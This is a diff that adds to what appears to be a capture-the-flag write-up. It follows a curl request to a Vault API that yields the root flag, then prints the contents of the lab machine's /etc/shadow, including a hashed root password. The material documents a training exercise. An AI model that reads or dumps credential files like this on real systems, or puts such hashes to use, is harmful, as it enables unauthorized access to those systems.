@@ -203,3 +203,30 @@ curl --header "X-Vault-Token: $VAULT_TOKEN" --request POST --data '{"ip":"10.10.
 ```
 
 GIVES US ROOT FLAG!
+
+`/etc/shadow`
+```sh
+root:$y$j9T$4uH0lUFbgz7XKRP4f/FgP.$gEGN1NQvQhD2aRx452dXMDPZm67IbrFtfzxH.6smSl7:19669:0:99999:7:::
+daemon:*:19579:0:99999:7:::
+bin:*:19579:0:99999:7:::
+sys:*:19579:0:99999:7:::
+sync:*:19579:0:99999:7:::
+games:*:19579:0:99999:7:::
+man:*:19579:0:99999:7:::
+lp:*:19579:0:99999:7:::
+mail:*:19579:0:99999:7:::
+news:*:19579:0:99999:7:::
+uucp:*:19579:0:99999:7:::
+proxy:*:19579:0:99999:7:::
+www-data:*:19579:0:99999:7:::
+backup:*:19579:0:99999:7:::
+list:*:19579:0:99999:7:::
+irc:*:19579:0:99999:7:::
+gnats:*:19579:0:99999:7:::
+nobody:*:19579:0:99999:7:::
+_apt:*:19579:0:99999:7:::
+systemd-network:*:19579:0:99999:7:::
+systemd-resolve:*:19579:0:99999:7:::
+```
+
+<img src="https://giffiles.alphacoders.com/206/206739.gif">
